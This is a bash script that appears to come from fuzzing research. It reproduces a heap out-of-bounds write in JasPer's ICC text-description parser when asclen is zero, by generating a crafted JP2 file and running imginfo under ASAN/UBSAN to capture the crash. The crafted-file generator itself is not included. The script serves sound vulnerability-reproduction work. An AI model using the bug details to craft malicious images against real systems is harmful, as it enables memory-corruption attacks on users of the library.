#!/usr/bin/env bash
# VULN 001 PoC runner - Heap OOB write in jas_icctxtdesc_input (asclen == 0)

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/jasper/src_libjasper_base_jas_icc_c"
BINARY="/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo"
INPUT="${POC_DIR}/vuln_001.jp2"
RESULT="${POC_DIR}/vuln_001_result.txt"
ASAN_LOG="${POC_DIR}/asan.log"

# Step 1: Generate the crafted JP2 file
echo "[*] Generating crafted JP2 with ICC profile (asclen=0) ..."
python3 "${POC_DIR}/vuln_001_gen.py"

# Step 2: Run imginfo under ASAN/UBSAN
echo "[*] Running imginfo ..."
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG}" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
  "${BINARY}" \
  -f "${INPUT}" \
  > "${RESULT}" 2>&1 || true

echo "[*] imginfo exit status captured (non-zero expected due to crash)"

# Step 3: Append ASAN/UBSAN output if available
echo "" >> "${RESULT}"
echo "=== ASAN/UBSAN output ===" >> "${RESULT}"
for logfile in "${ASAN_LOG}".*; do
    if [ -f "${logfile}" ]; then
        echo "--- ${logfile} ---" >> "${RESULT}"
        cat "${logfile}" >> "${RESULT}"
    fi
done

# Also check for asan.log without suffix (pid appended by ASAN)
if [ -f "${ASAN_LOG}" ]; then
    echo "--- ${ASAN_LOG} ---" >> "${RESULT}"
    cat "${ASAN_LOG}" >> "${RESULT}"
fi

echo ""
echo "[*] Result written to: ${RESULT}"
echo "=== Result summary ==="
head -30 "${RESULT}" || true
echo ""
echo "=== ASAN output (last 40 lines) ==="
for logfile in "${ASAN_LOG}".*; do
    if [ -f "${logfile}" ]; then
        tail -40 "${logfile}" || true
    fi
done
